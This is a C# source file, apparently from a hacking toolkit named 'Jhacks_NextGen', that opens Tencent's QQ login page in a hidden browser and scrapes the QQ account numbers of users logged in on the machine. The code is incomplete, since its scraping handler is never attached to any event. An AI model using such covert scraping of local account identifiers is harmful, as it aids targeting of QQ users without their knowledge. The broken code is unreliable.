using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Jhacks_NextGen
{
    public class QQFetcher : IDisposable
    {
        private WebBrowser webBrowser;
        private string qqNumbers;
        private Form form;

        public QQFetcher()
        {
            InitializeForm();
        }

        private void InitializeForm()
        {
            form = new Form();
            form.Load += Form_Load;
        }

        private void Form_Load(object sender, EventArgs e)
        {
            InitializeWebBrowser();
            RetrieveQQNumbersAsync();
        }

        private void InitializeWebBrowser()
        {
            webBrowser = new WebBrowser();
            webBrowser.ScriptErrorsSuppressed = true;
            webBrowser.Visible = false;
            webBrowser.DocumentCompleted += WebBrowser_DocumentCompleted;

            // Web控件载入页面（这个页面就是我们用来获取QQ号的页面）
            webBrowser.Navigate("http://ui.ptlogin2.qq.com/cgi-bin/login?hide_title_bar=0&low_login=0&qlogin_auto_login=1&no_verifyimg=1&link_target=blank&appid=636014201&target=self&s_url=http%3A//www.qq.com/qq2012/loginSuccess.htm");
        }

        private async void RetrieveQQNumbersAsync()
        {
            await Task.Delay(1000); // 等待一段时间确保WebBrowser加载完成
            webBrowser.Document.InvokeScript("eval", new object[] { "document.getElementById('qlogin_list').fireEvent('onpropertychange');" });
        }

        private void WebBrowser_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            // 不需要在这里执行任何操作
        }

        private void Handler(object sender, EventArgs e)
        {
            HtmlElement div = webBrowser.Document.GetElementById("qlogin_list");
            if (div == null) return;
            string contentLoaded = div.InnerHtml; // get the content loaded via ajax

            List<string> QQNumberList = new List<string>();
            HtmlElementCollection htmlElementCollection = div.All;
            foreach (HtmlElement currentElement in htmlElementCollection)
            {
                string curstr = currentElement.OuterHtml;
                if (curstr != null)
                {
                    string idstr = currentElement.GetAttribute("id");
                    if (idstr.Contains("img_"))
                    {
                        if (curstr.ToLower().Contains("<img"))
                        {
                            QQNumberList.Add(Match_Str("uin=\"", "\"", curstr));
                        }
                    }
                }
            }

            qqNumbers = string.Join(", ", QQNumberList); // 将QQ号码以逗号分隔的形式保存在字符串中

            form.Close(); // 关闭窗口
        }

        #region 获取字符串指定头和尾之间的内容

        private string Match_Str(string startChar, string endChar, string str)
        {
            try
            {
                Regex reg = new Regex("(?<=" + startChar + ").*?(?=" + endChar + ")", RegexOptions.IgnoreCase);
                Match m = reg.Match(str);
                if (m.Success)
                {
                    return m.ToString();
                }
            }
            catch (System.Exception ex)
            {

            }
            return "";
        }

        #endregion

        public string GetQQNumbers()
        {
            form.ShowDialog(); // 运行WebBrowser以获取QQ号码
            return qqNumbers; // 返回获取到的QQ号码
        }

        public void Dispose()
        {
            webBrowser.Dispose();
            form.Dispose();
        }
    }


}
